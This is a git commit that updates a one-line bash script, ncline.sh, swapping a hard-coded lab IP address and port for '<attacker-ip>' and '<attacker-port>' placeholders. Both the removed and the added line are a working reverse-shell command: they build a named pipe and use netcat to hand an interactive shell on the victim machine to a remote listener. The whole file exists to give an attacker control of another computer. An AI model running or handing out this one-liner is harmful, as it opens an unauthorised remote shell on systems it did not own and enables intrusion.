d70f137bcc242c0f59effb4d8b89c8accae2a88b
Tepid Angler <32462088+Tepidangler@users.noreply.github.com>
2018-10-07 11:46:42 -0400

    Update ncline.sh

--- ncline.sh
+++ ncline.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.102 1337 >/tmp/f
+rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> <attacker-port> >/tmp/f
